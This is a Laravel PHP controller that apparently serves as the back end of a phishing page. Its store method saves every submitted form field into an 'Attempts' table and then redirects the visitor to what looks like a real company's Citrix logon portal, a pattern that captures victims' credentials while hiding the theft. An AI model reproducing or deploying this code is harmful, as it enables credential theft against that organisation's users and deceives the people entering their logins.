<?php

namespace App\Http\Controllers;

use App\Models\Attempts;
use Illuminate\Http\Request;

class HomeController extends Controller
{

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
        return view('welcome');
    }

    public function store(Request $request)
    {

       $attemps= Attempts::create($request->all());

       return redirect()->away('https://citrix.longhornpublishers.com/logon/LogonPoint/index.html');
    }


}
